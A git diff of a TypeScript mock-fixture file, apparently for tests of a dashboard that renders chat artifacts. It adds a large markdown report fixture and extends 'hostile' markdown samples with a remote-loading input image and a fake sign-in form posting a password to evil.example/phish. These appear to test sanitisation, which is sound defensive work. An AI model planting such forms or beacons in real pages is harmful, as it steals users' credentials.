@@ -106,8 +106,16 @@ const REMOTE_NOTES = `# Remote notes
 
 <svg width="10" height="10"><filter id="f"><feImage href="https://evil.example/md-fe.png"/></filter><rect width="10" height="10" filter="url(#f)"/></svg>
 
+<input type="image" src="https://evil.example/md-input.png" alt="go">
+
+<form action="https://evil.example/phish" method="post"><input name="password" type="password"><textarea name="t">x</textarea><select name="s"><option>a</option></select><button>Sign in</button></form>
+
 Plain words stay.
 `;
+
+/** A long markdown report (about 1 MB, with code blocks) for the typing-speed test. */
+const BIG_NOTES = '# Big notes\n\n' + Array.from({ length: 9000 }, (_, i) =>
+  `## Section ${i + 1}\n\nSome **bold** words and a list:\n\n- one\n- two\n\n\`\`\`js\nconst x${i} = ${i};\n\`\`\`\n`).join('\n');
 
 /** A page that loads from the two allowed library CDNs, and from two places it must not. */
 const CDN_PAGE = `<!doctype html><html><body><h1>CDN page</h1>
@@ -153,6 +161,7 @@ export const mockArtifacts = new Map<string, MockArtifactVersion[]>([
   one(26, { fileName: 'remote notes', contentType: 'text/markdown', downloadName: 'remote notes.md', bytes: text(REMOTE_NOTES) }),
   one(27, { fileName: 'cdn page', contentType: 'text/html', downloadName: 'cdn page.html', bytes: text(CDN_PAGE) }),
   one(28, { fileName: 'blob hop', contentType: 'text/html', downloadName: 'blob hop.html', bytes: text(BLOB_HOP_PAGE) }),
+  one(29, { fileName: 'big notes', contentType: 'text/markdown', downloadName: 'big notes.md', bytes: text(BIG_NOTES) }),
 ]);
 
 /** The URL-free descriptor the stream and the transcript carry for one stored version. */
@@ -172,7 +181,10 @@ function refsTurn(reply: string, refs: Array<ReturnType<typeof artifactRef>>): M
 }
 
 export const artifactFixtures: Record<string, MockSseEvent[]> = {
-  artifacts: refsTurn('Here are your files.', [1, 2, 3, 4, 5, 6, 7, 8, 9, 10].map((n) => artifactRef(id(n)))),
+  // Eight: the most references one turn can carry (MAX_DASHBOARD_ARTIFACT_REFS in the real route).
+  artifacts: refsTurn('Here are your files.', [1, 2, 3, 4, 5, 6, 7, 8].map((n) => artifactRef(id(n)))),
+  office: refsTurn('Here are the office files.', [9, 10].map((n) => artifactRef(id(n)))),
+  big: refsTurn('Here is the long report.', [artifactRef(id(29))]),
   versions: refsTurn('Here is the first plan.', [artifactRef(id(11), 1)]),
   hostile: refsTurn('Here are the strange files.', [21, 22, 23, 24, 25, 26, 28].map((n) => artifactRef(id(n)))),
   cdn: refsTurn('Here is the page.', [artifactRef(id(27))]),
